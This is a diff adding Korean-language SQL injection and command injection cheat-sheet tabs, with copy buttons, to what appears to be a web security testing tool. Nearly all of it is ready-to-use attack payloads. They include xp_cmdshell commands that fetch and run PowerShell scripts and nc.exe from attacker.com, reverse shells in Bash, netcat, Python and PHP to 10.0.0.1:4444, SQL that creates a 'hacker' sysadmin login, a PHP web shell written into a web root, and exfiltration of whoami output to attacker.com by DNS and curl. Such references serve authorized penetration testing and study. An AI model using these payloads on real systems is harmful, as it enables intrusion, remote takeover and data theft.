+                        <div class="cheat-label">다중 쿼리 실행</div>
+                        <code class="cheat-code">'; SELECT SYSTEM_USER;-- </code>
+                        <code class="cheat-code">'; INSERT INTO users VALUES ('hacker','password');-- </code>
+                        <button class="btn btn-secondary btn-sm" onclick="copyCheat(this)">📋</button>
+                    </div>
+
+                    <div class="cheat-item">
+                        <div class="cheat-label">사용자 생성</div>
+                        <code class="cheat-code">'; EXEC sp_addlogin 'hacker','P@ssw0rd';-- </code>
+                        <button class="btn btn-secondary btn-sm" onclick="copyCheat(this)">📋</button>
+                    </div>
+
+                    <div class="cheat-item">
+                        <div class="cheat-label">권한 부여</div>
+                        <code class="cheat-code">'; EXEC sp_addsrvrolemember 'hacker','sysadmin';-- </code>
+                        <button class="btn btn-secondary btn-sm" onclick="copyCheat(this)">📋</button>
+                    </div>
+
+                    <h4>Command Execution (RCE)</h4>
+                    <div class="cheat-item">
+                        <div class="cheat-label">xp_cmdshell 기본 사용</div>
+                        <code class="cheat-code">'; EXEC xp_cmdshell 'whoami';-- </code>
+                        <code class="cheat-code">'; EXEC xp_cmdshell 'net user';-- </code>
+                        <code class="cheat-code">'; EXEC master..xp_cmdshell 'dir C:\';-- </code>
+                        <button class="btn btn-secondary btn-sm" onclick="copyCheat(this)">📋</button>
+                    </div>
+
+                    <div class="cheat-item">
+                        <div class="cheat-label">xp_cmdshell 활성화</div>
+                        <code class="cheat-code">'; EXEC sp_configure 'show advanced options',1; RECONFIGURE;-- </code>
+                        <code class="cheat-code">'; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;-- </code>
+                        <button class="btn btn-secondary btn-sm" onclick="copyCheat(this)">📋</button>
+                    </div>
+
+                    <div class="cheat-item">
+                        <div class="cheat-label">PowerShell 다운로드 실행</div>
+                        <code class="cheat-code">'; EXEC xp_cmdshell 'powershell IEX(New-Object Net.WebClient).DownloadString("http://attacker.com/shell.ps1")';-- </code>
+                        <button class="btn btn-secondary btn-sm" onclick="copyCheat(this)">📋</button>
+                    </div>
+
+                    <div class="cheat-item">
+                        <div class="cheat-label">파일 다운로드</div>
+                        <code class="cheat-code">'; EXEC xp_cmdshell 'certutil -urlcache -f http://attacker.com/nc.exe C:\temp\nc.exe';-- </code>
+                        <button class="btn btn-secondary btn-sm" onclick="copyCheat(this)">📋</button>
+                    </div>
+
+                    <div class="cheat-item">
+                        <div class="cheat-label">리버스 쉘</div>
+                        <code class="cheat-code">'; EXEC xp_cmdshell 'C:\temp\nc.exe -e cmd.exe 10.0.0.1 4444';-- </code>
+                        <button class="btn btn-secondary btn-sm" onclick="copyCheat(this)">📋</button>
+                    </div>
+
+                    <h4>OLE Automation (xp_cmdshell 대체)</h4>
+                    <div class="cheat-item">
+                        <div class="cheat-label">OLE 활성화</div>
+                        <code class="cheat-code">'; EXEC sp_configure 'Ole Automation Procedures',1; RECONFIGURE;-- </code>
+                        <button class="btn btn-secondary btn-sm" onclick="copyCheat(this)">📋</button>
+                    </div>
+
+                    <div class="cheat-item">
+                        <div class="cheat-label">WScript.Shell로 명령 실행</div>
+                        <code class="cheat-code">DECLARE @output INT; EXEC sp_oacreate 'wscript.shell', @output OUTPUT; EXEC sp_oamethod @output, 'run', NULL, 'cmd.exe /c whoami';</code>
+                        <button class="btn btn-secondary btn-sm" onclick="copyCheat(this)">📋</button>
+                    </div>
+
+                    <h4>파일 작업</h4>
+                    <div class="cheat-item">
+                        <div class="cheat-label">BULK INSERT로 파일 읽기</div>
+                        <code class="cheat-code">'; CREATE TABLE temp(data varchar(8000)); BULK INSERT temp FROM 'C:\Windows\System32\drivers\etc\hosts';-- </code>
+                        <button class="btn btn-secondary btn-sm" onclick="copyCheat(this)">📋</button>
+                    </div>
+
+                    <div class="cheat-item">
+                        <div class="cheat-label">BCP로 파일 쓰기</div>
+                        <code class="cheat-code">'; EXEC xp_cmdshell 'bcp "SELECT ''&lt;?php system($_GET[cmd]); ?&gt;'' AS shell" queryout "C:\inetpub\wwwroot\shell.php" -c -T';-- </code>
+                        <button class="btn btn-secondary btn-sm" onclick="copyCheat(this)">📋</button>
+                    </div>
+
+                    <div class="cheat-item">
+                        <div class="cheat-label">OPENROWSET으로 파일 읽기</div>
+                        <code class="cheat-code">SELECT * FROM OPENROWSET(BULK 'C:\Windows\System32\drivers\etc\hosts', SINGLE_CLOB) AS data</code>
+                        <button class="btn btn-secondary btn-sm" onclick="copyCheat(this)">📋</button>
+                    </div>
+
+                    <h4>유용한 함수</h4>
+                    <div class="cheat-item">
+                        <div class="cheat-label">SUBSTRING</div>
+                        <code class="cheat-code">SELECT SUBSTRING(@@version,1,10)</code>
+                        <button class="btn btn-secondary btn-sm" onclick="copyCheat(this)">📋</button>
+                    </div>
+
+                    <div class="cheat-item">
+                        <div class="cheat-label">LEN</div>
+                        <code class="cheat-code">SELECT LEN(DB_NAME())</code>
+                        <button class="btn btn-secondary btn-sm" onclick="copyCheat(this)">📋</button>
+                    </div>
+
+                    <div class="cheat-item">
+                        <div class="cheat-label">STUFF (문자열 결합)</div>
+                        <code class="cheat-code">SELECT STUFF((SELECT ','+username FROM users FOR XML PATH('')),1,1,'')</code>
+                        <button class="btn btn-secondary btn-sm" onclick="copyCheat(this)">📋</button>
+                    </div>
+
+                    <div class="cheat-item">
+                        <div class="cheat-label">TOP (행 제한)</div>
+                        <code class="cheat-code">SELECT TOP 1 username FROM users</code>
+                        <button class="btn btn-secondary btn-sm" onclick="copyCheat(this)">📋</button>
+                    </div>
+
+                    <div class="cheat-item">
+                        <div class="cheat-label">CHAR (문자 변환)</div>
+                        <code class="cheat-code">SELECT CHAR(65)+CHAR(100)+CHAR(109)+CHAR(105)+CHAR(110)</code>
+                        <button class="btn btn-secondary btn-sm" onclick="copyCheat(this)">📋</button>
+                    </div>
+
+                    <h4>링크드 서버 공격</h4>
+                    <div class="cheat-item">
+                        <div class="cheat-label">링크드 서버 목록</div>
+                        <code class="cheat-code">SELECT * FROM sys.servers</code>
+                        <code class="cheat-code">EXEC sp_linkedservers</code>
+                        <button class="btn btn-secondary btn-sm" onclick="copyCheat(this)">📋</button>
+                    </div>
+
+                    <div class="cheat-item">
+                        <div class="cheat-label">링크드 서버에서 쿼리 실행</div>
+                        <code class="cheat-code">SELECT * FROM OPENQUERY([LinkedServer], 'SELECT @@version')</code>
+                        <button class="btn btn-secondary btn-sm" onclick="copyCheat(this)">📋</button>
+                    </div>
+
+                    <div class="cheat-item">
+                        <div class="cheat-label">링크드 서버에서 xp_cmdshell</div>
+                        <code class="cheat-code">EXEC ('xp_cmdshell "whoami"') AT [LinkedServer]</code>
+                        <button class="btn btn-secondary btn-sm" onclick="copyCheat(this)">📋</button>
+                    </div>
+
+                    <h4>기본 정보</h4>
+                            <div class="cheat-item">
+                                <div class="cheat-label">버전</div>
+                                <code class="cheat-code">SELECT version()</code>
+                                <button class="btn btn-secondary btn-sm" onclick="copyCheat(this)">📋</button>
+                            </div>
+                            <div class="cheat-item">
+                                <div class="cheat-label">현재 사용자</div>
+                                <code class="cheat-code">SELECT current_user</code>
+                                <button class="btn btn-secondary btn-sm" onclick="copyCheat(this)">📋</button>
+                            </div>
+                            <div class="cheat-item">
+                                <div class="cheat-label">현재 DB</div>
+                                <code class="cheat-code">SELECT current_database()</code>
+                                <button class="btn btn-secondary btn-sm" onclick="copyCheat(this)">📋</button>
+                            </div>
+                        </div>
+
+                        <div class="cheat-section">
+                            <h4>UNION-based</h4>
+                            <div class="cheat-item">
+                                <div class="cheat-label">UNION SELECT</div>
+                                <code class="cheat-code">' UNION SELECT NULL,NULL,NULL-- </code>
+                                <button class="btn btn-secondary btn-sm" onclick="copyCheat(this)">📋</button>
+                            </div>
+                            <div class="cheat-item">
+                                <div class="cheat-label">테이블 목록</div>
+                                <code class="cheat-code">' UNION SELECT tablename,NULL FROM pg_tables WHERE schemaname='public'-- </code>
+                                <button class="btn btn-secondary btn-sm" onclick="copyCheat(this)">📋</button>
+                            </div>
+                            <div class="cheat-item">
+                                <div class="cheat-label">컬럼 목록</div>
+                                <code class="cheat-code">' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'-- </code>
+                                <button class="btn btn-secondary btn-sm" onclick="copyCheat(this)">📋</button>
+                            </div>
+                        </div>
+
+                        <div class="cheat-section">
+                            <h4>Error-based</h4>
+                            <div class="cheat-item">
+                                <div class="cheat-label">CAST 오류</div>
+                                <code class="cheat-code">' AND 1=CAST((SELECT version()) AS int)-- </code>
+                                <button class="btn btn-secondary btn-sm" onclick="copyCheat(this)">📋</button>
+                            </div>
+                            <div class="cheat-item">
+                                <div class="cheat-label">Division by zero</div>
+                                <code class="cheat-code">' AND 1=(SELECT CASE WHEN (1=1) THEN 1/(SELECT 0) ELSE NULL END)-- </code>
+                                <button class="btn btn-secondary btn-sm" onclick="copyCheat(this)">📋</button>
+                            </div>
+                        </div>
+
+                        <div class="cheat-section">
+                            <h4>Time-based</h4>
+                            <div class="cheat-item">
+                                <div class="cheat-label">pg_sleep</div>
+                                <code class="cheat-code">' AND pg_sleep(5)-- </code>
+                                <button class="btn btn-secondary btn-sm" onclick="copyCheat(this)">📋</button>
+                            </div>
+                            <div class="cheat-item">
+                                <div class="cheat-label">조건부 pg_sleep</div>
+                                <code class="cheat-code">' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)-- </code>
+                                <button class="btn btn-secondary btn-sm" onclick="copyCheat(this)">📋</button>
+                            </div>
+                        </div>
+
+                        <div class="cheat-section">
+                            <h4>유용한 함수</h4>
+                            <div class="cheat-item">
+                                <div class="cheat-label">STRING_AGG (문자열 결합)</div>
+                                <code class="cheat-code">SELECT STRING_AGG(username, ',') FROM users</code>
+                                <button class="btn btn-secondary btn-sm" onclick="copyCheat(this)">📋</button>
+                            </div>
+                            <div class="cheat-item">
+                                <div class="cheat-label">파일 읽기 (COPY)</div>
+                                <code class="cheat-code">'; CREATE TABLE file_store(data text); COPY file_store FROM '/etc/passwd'-- </code>
+                                <button class="btn btn-secondary btn-sm" onclick="copyCheat(this)">📋</button>
+                            </div>
+                            <div class="cheat-item">
+                                <div class="cheat-label">LENGTH</div>
+                                <code class="cheat-code">SELECT LENGTH(current_database())</code>
+                                <button class="btn btn-secondary btn-sm" onclick="copyCheat(this)">📋</button>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Oracle -->
+                    <div class="cheat-category" data-dbms="oracle">
+                        <h3 style="color: var(--color-primary); margin: 16px 0; border-bottom: 2px solid var(--color-primary); padding-bottom: 8px;">
+                            🔮 Oracle
+                        </h3>
+
+                        <div class="cheat-section">
+                            <h4>기본 정보</h4>
+                            <div class="cheat-item">
+                                <div class="cheat-label">버전</div>
+                                <code class="cheat-code">SELECT banner FROM v$version</code>
+                                <button class="btn btn-secondary btn-sm" onclick="copyCheat(this)">📋</button>
+                            </div>
+                            <div class="cheat-item">
+                                <div class="cheat-label">현재 사용자</div>
+                                <code class="cheat-code">SELECT USER FROM dual</code>
+                                <button class="btn btn-secondary btn-sm" onclick="copyCheat(this)">📋</button>
+                            </div>
+                        </div>
+
+                        <div class="cheat-section">
+                            <h4>UNION-based (dual 필요)</h4>
+                            <div class="cheat-item">
+                                <div class="cheat-label">UNION SELECT</div>
+                                <code class="cheat-code">' UNION SELECT NULL,NULL FROM dual-- </code>
+                                <button class="btn btn-secondary btn-sm" onclick="copyCheat(this)">📋</button>
+                            </div>
+                            <div class="cheat-item">
+                                <div class="cheat-label">테이블 목록</div>
+                                <code class="cheat-code">' UNION SELECT table_name,NULL FROM all_tables-- </code>
+                                <button class="btn btn-secondary btn-sm" onclick="copyCheat(this)">📋</button>
+                            </div>
+                            <div class="cheat-item">
+                                <div class="cheat-label">컬럼 목록</div>
+                                <code class="cheat-code">' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS'-- </code>
+                                <button class="btn btn-secondary btn-sm" onclick="copyCheat(this)">📋</button>
+                            </div>
+                        </div>
+
+                        <div class="cheat-section">
+                            <h4>Error-based</h4>
+                            <div class="cheat-item">
+                                <div class="cheat-label">CTXSYS.DRITHSX.SN</div>
+                                <code class="cheat-code">' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT user FROM dual))-- </code>
+                                <button class="btn btn-secondary btn-sm" onclick="copyCheat(this)">📋</button>
+                            </div>
+                            <div class="cheat-item">
+                                <div class="cheat-label">UTL_INADDR.GET_HOST_NAME</div>
+                                <code class="cheat-code">' AND 1=UTL_INADDR.GET_HOST_NAME((SELECT user FROM dual))-- </code>
+                                <button class="btn btn-secondary btn-sm" onclick="copyCheat(this)">📋</button>
+                            </div>
+                        </div>
+
+                        <div class="cheat-section">
+                            <h4>Time-based</h4>
+                            <div class="cheat-item">
+                                <div class="cheat-label">DBMS_LOCK.SLEEP</div>
+                                <code class="cheat-code">' AND DBMS_LOCK.SLEEP(5)-- </code>
+                                <button class="btn btn-secondary btn-sm" onclick="copyCheat(this)">📋</button>
+                            </div>
+                        </div>
+
+                        <div class="cheat-section">
+                            <h4>유용한 함수</h4>
+                            <div class="cheat-item">
+                                <div class="cheat-label">CONCAT (||)</div>
+                                <code class="cheat-code">SELECT username || ':' || password FROM users</code>
+                                <button class="btn btn-secondary btn-sm" onclick="copyCheat(this)">📋</button>
+                            </div>
+                            <div class="cheat-item">
+                                <div class="cheat-label">SUBSTR</div>
+                                <code class="cheat-code">SELECT SUBSTR(banner,1,10) FROM v$version</code>
+                                <button class="btn btn-secondary btn-sm" onclick="copyCheat(this)">📋</button>
+                            </div>
+                            <div class="cheat-item">
+                                <div class="cheat-label">LENGTH</div>
+                                <code class="cheat-code">SELECT LENGTH(user) FROM dual</code>
+                                <button class="btn btn-secondary btn-sm" onclick="copyCheat(this)">📋</button>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- SQLite -->
+                    <div class="cheat-category" data-dbms="sqlite">
+                        <h3 style="color: var(--color-primary); margin: 16px 0; border-bottom: 2px solid var(--color-primary); padding-bottom: 8px;">
+                            📦 SQLite
+                        </h3>
+
+                        <div class="cheat-section">
+                            <h4>기본 정보</h4>
+                            <div class="cheat-item">
+                                <div class="cheat-label">버전</div>
+                                <code class="cheat-code">SELECT sqlite_version()</code>
+                                <button class="btn btn-secondary btn-sm" onclick="copyCheat(this)">📋</button>
+                            </div>
+                        </div>
+
+                        <div class="cheat-section">
+                            <h4>UNION-based</h4>
+                            <div class="cheat-item">
+                                <div class="cheat-label">테이블 목록</div>
+                                <code class="cheat-code">' UNION SELECT name,sql FROM sqlite_master WHERE type='table'-- </code>
+                                <button class="btn btn-secondary btn-sm" onclick="copyCheat(this)">📋</button>
+                            </div>
+                            <div class="cheat-item">
+                                <div class="cheat-label">컬럼 정보</div>
+                                <code class="cheat-code">' UNION SELECT sql,NULL FROM sqlite_master WHERE name='users'-- </code>
+                                <button class="btn btn-secondary btn-sm" onclick="copyCheat(this)">📋</button>
+                            </div>
+                        </div>
+
+                        <div class="cheat-section">
+                            <h4>유용한 함수</h4>
+                            <div class="cheat-item">
+                                <div class="cheat-label">SUBSTR</div>
+                                <code class="cheat-code">SELECT SUBSTR(sqlite_version(),1,1)</code>
+                                <button class="btn btn-secondary btn-sm" onclick="copyCheat(this)">📋</button>
+                            </div>
+                            <div class="cheat-item">
+                                <div class="cheat-label">LENGTH</div>
+                                <code class="cheat-code">SELECT LENGTH(sqlite_version())</code>
+                                <button class="btn btn-secondary btn-sm" onclick="copyCheat(this)">📋</button>
+                            </div>
+                        </div>
+                    </div>
+
                 </div>
-                <div id="xss-message" class="message"></div>
             </div>
+
+
+                        <!-- Command Injection Cheat Sheet Tab -->
+            <div class="tab-content" id="cmdi">
+                <div class="info-box">
+                    <strong>⚡ Command Injection Cheat Sheet:</strong> OS별 Command Injection 페이로드 모음입니다.
+                </div>
+
+                <div style="margin-bottom: 16px;">
+                    <label for="cmdi-filter">OS 필터</label>
+                    <select id="cmdi-filter" onchange="filterCMDi()" style="width: 100%; padding: 8px; border: 1px solid var(--color-border); border-radius: var(--radius-base); background: var(--color-background); color: var(--color-text);">
+                        <option value="all">전체 보기</option>
+                        <option value="linux">Linux / Unix</option>
+                        <option value="windows">Windows</option>
+                        <option value="both">공통</option>
+                    </select>
+                </div>
+
+                <div id="cmdi-cheatsheet">
+
+                    <!-- Linux / Unix -->
+                    <div class="cheat-category" data-os="linux">
+                        <h3 style="color: var(--color-primary); margin: 16px 0; border-bottom: 2px solid var(--color-primary); padding-bottom: 8px;">
+                            🐧 Linux / Unix
+                        </h3>
+
+                        <div class="cheat-section">
+                            <h4>명령어 구분자</h4>
+                            <div class="cheat-item">
+                                <div class="cheat-label">세미콜론 (;)</div>
+                                <code class="cheat-code">test; whoami</code>
+                                <button class="btn btn-secondary btn-sm" onclick="copyCheat(this)">📋</button>
+                            </div>
+                            <div class="cheat-item">
+                                <div class="cheat-label">파이프 (|)</div>
+                                <code class="cheat-code">test | whoami</code>
+                                <button class="btn btn-secondary btn-sm" onclick="copyCheat(this)">📋</button>
+                            </div>
+                            <div class="cheat-item">
+                                <div class="cheat-label">AND (&&)</div>
+                                <code class="cheat-code">test && whoami</code>
+                                <button class="btn btn-secondary btn-sm" onclick="copyCheat(this)">📋</button>
+                            </div>
+                            <div class="cheat-item">
+                                <div class="cheat-label">OR (||)</div>
+                                <code class="cheat-code">test || whoami</code>
+                                <button class="btn btn-secondary btn-sm" onclick="copyCheat(this)">📋</button>
+                            </div>
+                            <div class="cheat-item">
+                                <div class="cheat-label">백틱 (`)</div>
+                                <code class="cheat-code">`whoami`</code>
+                                <button class="btn btn-secondary btn-sm" onclick="copyCheat(this)">📋</button>
+                            </div>
+                            <div class="cheat-item">
+                                <div class="cheat-label">$() 치환</div>
+                                <code class="cheat-code">$(whoami)</code>
+                                <button class="btn btn-secondary btn-sm" onclick="copyCheat(this)">📋</button>
+                            </div>
+                            <div class="cheat-item">
+                                <div class="cheat-label">줄바꿈 (%0A)</div>
+                                <code class="cheat-code">test%0Awhoami</code>
+                                <button class="btn btn-secondary btn-sm" onclick="copyCheat(this)">📋</button>
+                            </div>
+                        </div>
+
+                        <div class="cheat-section">
+                            <h4>공백 우회</h4>
+                            <div class="cheat-item">
+                                <div class="cheat-label">${IFS}</div>
+                                <code class="cheat-code">cat${IFS}/etc/passwd</code>
+                                <button class="btn btn-secondary btn-sm" onclick="copyCheat(this)">📋</button>
+                            </div>
+                            <div class="cheat-item">
+                                <div class="cheat-label">${IFS$9}</div>
+                                <code class="cheat-code">cat${IFS$9}/etc/passwd</code>
+                                <button class="btn btn-secondary btn-sm" onclick="copyCheat(this)">📋</button>
+                            </div>
+                            <div class="cheat-item">
+                                <div class="cheat-label">Tab (%09)</div>
+                                <code class="cheat-code">cat%09/etc/passwd</code>
+                                <button class="btn btn-secondary btn-sm" onclick="copyCheat(this)">📋</button>
+                            </div>
+                            <div class="cheat-item">
+                                <div class="cheat-label">리다이렉션</div>
+                                <code class="cheat-code">cat/etc/passwd</code>
+                                <button class="btn btn-secondary btn-sm" onclick="copyCheat(this)">📋</button>
+                            </div>
+                            <div class="cheat-item">
+                                <div class="cheat-label">Brace Expansion {}</div>
+                                <code class="cheat-code">{cat,/etc/passwd}</code>
+                                <button class="btn btn-secondary btn-sm" onclick="copyCheat(this)">📋</button>
+                            </div>
+                        </div>
+
+                        <div class="cheat-section">
+                            <h4>정보 수집</h4>
+                            <div class="cheat-item">
+                                <div class="cheat-label">사용자 정보</div>
+                                <code class="cheat-code">whoami</code>
+                                <button class="btn btn-secondary btn-sm" onclick="copyCheat(this)">📋</button>
+                            </div>
+                            <div class="cheat-item">
+                                <div class="cheat-label">사용자 ID</div>
+                                <code class="cheat-code">id</code>
+                                <button class="btn btn-secondary btn-sm" onclick="copyCheat(this)">📋</button>
+                            </div>
+                            <div class="cheat-item">
+                                <div class="cheat-label">현재 디렉토리</div>
+                                <code class="cheat-code">pwd</code>
+                                <button class="btn btn-secondary btn-sm" onclick="copyCheat(this)">📋</button>
+                            </div>
+                            <div class="cheat-item">
+                                <div class="cheat-label">OS 정보</div>
+                                <code class="cheat-code">uname -a</code>
+                                <button class="btn btn-secondary btn-sm" onclick="copyCheat(this)">📋</button>
+                            </div>
+                            <div class="cheat-item">
+                                <div class="cheat-label">파일 목록</div>
+                                <code class="cheat-code">ls -la</code>
+                                <button class="btn btn-secondary btn-sm" onclick="copyCheat(this)">📋</button>
+                            </div>
+                            <div class="cheat-item">
+                                <div class="cheat-label">환경 변수</div>
+                                <code class="cheat-code">env</code>
+                                <button class="btn btn-secondary btn-sm" onclick="copyCheat(this)">📋</button>
+                            </div>
+                        </div>
+
+                        <div class="cheat-section">
+                            <h4>파일 읽기</h4>
+                            <div class="cheat-item">
+                                <div class="cheat-label">cat</div>
+                                <code class="cheat-code">cat /etc/passwd</code>
+                                <button class="btn btn-secondary btn-sm" onclick="copyCheat(this)">📋</button>
+                            </div>
+                            <div class="cheat-item">
+                                <div class="cheat-label">less</div>
+                                <code class="cheat-code">less /etc/passwd</code>
+                                <button class="btn btn-secondary btn-sm" onclick="copyCheat(this)">📋</button>
+                            </div>
+                            <div class="cheat-item">
+                                <div class="cheat-label">head</div>
+                                <code class="cheat-code">head -n 20 /etc/passwd</code>
+                                <button class="btn btn-secondary btn-sm" onclick="copyCheat(this)">📋</button>
+                            </div>
+                            <div class="cheat-item">
+                                <div class="cheat-label">tail</div>
+                                <code class="cheat-code">tail -n 20 /var/log/apache2/access.log</code>
+                                <button class="btn btn-secondary btn-sm" onclick="copyCheat(this)">📋</button>
+                            </div>
+                        </div>
+
+                        <div class="cheat-section">
+                            <h4>리버스 셸</h4>
+                            <div class="cheat-item">
+                                <div class="cheat-label">Bash TCP</div>
+                                <code class="cheat-code">bash -i >& /dev/tcp/10.0.0.1/4444 0>&1</code>
+                                <button class="btn btn-secondary btn-sm" onclick="copyCheat(this)">📋</button>
+                            </div>
+                            <div class="cheat-item">
+                                <div class="cheat-label">Netcat (nc)</div>
+                                <code class="cheat-code">nc -e /bin/sh 10.0.0.1 4444</code>
+                                <button class="btn btn-secondary btn-sm" onclick="copyCheat(this)">📋</button>
+                            </div>
+                            <div class="cheat-item">
+                                <div class="cheat-label">Python</div>
+                                <code class="cheat-code">python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'</code>
+                                <button class="btn btn-secondary btn-sm" onclick="copyCheat(this)">📋</button>
+                            </div>
+                            <div class="cheat-item">
+                                <div class="cheat-label">PHP</div>
+                                <code class="cheat-code">php -r '$sock=fsockopen("10.0.0.1",4444);exec("/bin/sh -i <&3 >&3 2>&3");'</code>
+                                <button class="btn btn-secondary btn-sm" onclick="copyCheat(this)">📋</button>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Windows -->
+                    <div class="cheat-category" data-os="windows">
+                        <h3 style="color: var(--color-primary); margin: 16px 0; border-bottom: 2px solid var(--color-primary); padding-bottom: 8px;">
+                            🪟 Windows
+                        </h3>
+
+                        <div class="cheat-section">
+                            <h4>명령어 구분자</h4>
+                            <div class="cheat-item">
+                                <div class="cheat-label">파이프 (|)</div>
+                                <code class="cheat-code">test | whoami</code>
+                                <button class="btn btn-secondary btn-sm" onclick="copyCheat(this)">📋</button>
+                            </div>
+                            <div class="cheat-item">
+                                <div class="cheat-label">AND (&)</div>
+                                <code class="cheat-code">test & whoami</code>
+                                <button class="btn btn-secondary btn-sm" onclick="copyCheat(this)">📋</button>
+                            </div>
+                            <div class="cheat-item">
+                                <div class="cheat-label">AND (&&)</div>
+                                <code class="cheat-code">test && whoami</code>
+                                <button class="btn btn-secondary btn-sm" onclick="copyCheat(this)">📋</button>
+                            </div>
+                            <div class="cheat-item">
+                                <div class="cheat-label">줄바꿈 (%0A)</div>
+                                <code class="cheat-code">test%0Awhoami</code>
+                                <button class="btn btn-secondary btn-sm" onclick="copyCheat(this)">📋</button>
+                            </div>
+                        </div>
+
+                        <div class="cheat-section">
+                            <h4>정보 수집</h4>
+                            <div class="cheat-item">
+                                <div class="cheat-label">사용자 정보</div>
+                                <code class="cheat-code">whoami</code>
+                                <button class="btn btn-secondary btn-sm" onclick="copyCheat(this)">📋</button>
+                            </div>
+                            <div class="cheat-item">
+                                <div class="cheat-label">호스트 이름</div>
+                                <code class="cheat-code">hostname</code>
+                                <button class="btn btn-secondary btn-sm" onclick="copyCheat(this)">📋</button>
+                            </div>
+                            <div class="cheat-item">
+                                <div class="cheat-label">OS 정보</div>
+                                <code class="cheat-code">systeminfo</code>
+                                <button class="btn btn-secondary btn-sm" onclick="copyCheat(this)">📋</button>
+                            </div>
+                            <div class="cheat-item">
+                                <div class="cheat-label">IP 설정</div>
+                                <code class="cheat-code">ipconfig /all</code>
+                                <button class="btn btn-secondary btn-sm" onclick="copyCheat(this)">📋</button>
+                            </div>
+                            <div class="cheat-item">
+                                <div class="cheat-label">네트워크 연결</div>
+                                <code class="cheat-code">netstat -ano</code>
+                                <button class="btn btn-secondary btn-sm" onclick="copyCheat(this)">📋</button>
+                            </div>
+                            <div class="cheat-item">
+                                <div class="cheat-label">프로세스</div>
+                                <code class="cheat-code">tasklist</code>
+                                <button class="btn btn-secondary btn-sm" onclick="copyCheat(this)">📋</button>
+                            </div>
+                        </div>
+
+                        <div class="cheat-section">
+                            <h4>파일/디렉토리</h4>
+                            <div class="cheat-item">
+                                <div class="cheat-label">현재 디렉토리</div>
+                                <code class="cheat-code">cd</code>
+                                <button class="btn btn-secondary btn-sm" onclick="copyCheat(this)">📋</button>
+                            </div>
+                            <div class="cheat-item">
+                                <div class="cheat-label">파일 목록</div>
+                                <code class="cheat-code">dir</code>
+                                <button class="btn btn-secondary btn-sm" onclick="copyCheat(this)">📋</button>
+                            </div>
+                            <div class="cheat-item">
+                                <div class="cheat-label">파일 읽기</div>
+                                <code class="cheat-code">type C:\Windows\System32\drivers\etc\hosts</code>
+                                <button class="btn btn-secondary btn-sm" onclick="copyCheat(this)">📋</button>
+                            </div>
+                            <div class="cheat-item">
+                                <div class="cheat-label">파일 검색</div>
+                                <code class="cheat-code">dir /s /b C:\*password*</code>
+                                <button class="btn btn-secondary btn-sm" onclick="copyCheat(this)">📋</button>
+                            </div>
+                        </div>
+
+                        <div class="cheat-section">
+                            <h4>권한 상승</h4>
+                            <div class="cheat-item">
+                                <div class="cheat-label">권한 확인</div>
+                                <code class="cheat-code">whoami /priv</code>
+                                <button class="btn btn-secondary btn-sm" onclick="copyCheat(this)">📋</button>
+                            </div>
+                            <div class="cheat-item">
+                                <div class="cheat-label">사용자 추가</div>
+                                <code class="cheat-code">net user hacker P@ssw0rd /add</code>
+                                <button class="btn btn-secondary btn-sm" onclick="copyCheat(this)">📋</button>
+                            </div>
+                            <div class="cheat-item">
+                                <div class="cheat-label">관리자 그룹 추가</div>
+                                <code class="cheat-code">net localgroup administrators hacker /add</code>
+                                <button class="btn btn-secondary btn-sm" onclick="copyCheat(this)">📋</button>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- 공통 -->
+                    <div class="cheat-category" data-os="both">
+                        <h3 style="color: var(--color-primary); margin: 16px 0; border-bottom: 2px solid var(--color-primary); padding-bottom: 8px;">
+                            🌐 공통 (Cross-Platform)
+                        </h3>
+
+                        <div class="cheat-section">
+                            <h4>블라인드 테스트</h4>
+                            <div class="cheat-item">
+                                <div class="cheat-label">DNS 요청</div>
+                                <code class="cheat-code">nslookup $(whoami).attacker.com</code>
+                                <button class="btn btn-secondary btn-sm" onclick="copyCheat(this)">📋</button>
+                            </div>
+                            <div class="cheat-item">
+                                <div class="cheat-label">Ping</div>
+                                <code class="cheat-code">ping -c 5 attacker.com</code>
+                                <button class="btn btn-secondary btn-sm" onclick="copyCheat(this)">📋</button>
+                            </div>
+                            <div class="cheat-item">
+                                <div class="cheat-label">cURL</div>
+                                <code class="cheat-code">curl http://attacker.com/$(whoami)</code>
+                                <button class="btn btn-secondary btn-sm" onclick="copyCheat(this)">📋</button>
+                            </div>
+                        </div>
+
+                        <div class="cheat-section">
+                            <h4>우회 기법</h4>
+                            <div class="cheat-item">
+                                <div class="cheat-label">Base64 인코딩</div>
+                                <code class="cheat-code">echo d2hvYW1p | base64 -d | bash</code>
+                                <button class="btn btn-secondary btn-sm" onclick="copyCheat(this)">📋</button>
+                            </div>
+                            <div class="cheat-item">
+                                <div class="cheat-label">환경 변수</div>
+                                <code class="cheat-code">$0</code>
+                                <button class="btn btn-secondary btn-sm" onclick="copyCheat(this)">📋</button>
+                            </div>
+                            <div class="cheat-item">
+                                <div class="cheat-label">Wildcard</div>
+                                <code class="cheat-code">/bin/c?t /etc/p?sswd</code>
+                                <button class="btn btn-secondary btn-sm" onclick="copyCheat(this)">📋</button>
+                            </div>
+                        </div>
+                    </div>
+
+                </div>
+            </div>
+
 
             <!-- JWT Tab -->
             <div class="tab-content" id="jwt">
@@ -846,9 +1882,9 @@
                     <label for="jwt-input">JWT 토큰</label>
                     <textarea id="jwt-input" placeholder="JWT 토큰을 입력하세요... (예: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...)"></textarea>
                     <div class="button-group">
-                        <button class="btn btn-primary" onclick="decodeJWT()">🔓 디코딩</button>
-                        <button class="btn btn-secondary" onclick="clearText('jwt-input')">🗑️ 초기화</button>
-                        <button class="btn btn-secondary" onclick="copyText('jwt-input')">📋 복사</button>
+                        <button class="btn btn-primary" data-action="decodeJWT">🔓 디코딩</button>
+                        <button class="btn btn-secondary" data-onclick="clearText('jwt-input')">🗑️ 초기화</button>
+                        <button class="btn btn-secondary" data-action="copy" data-target="jwt-input">📋 복사</button>
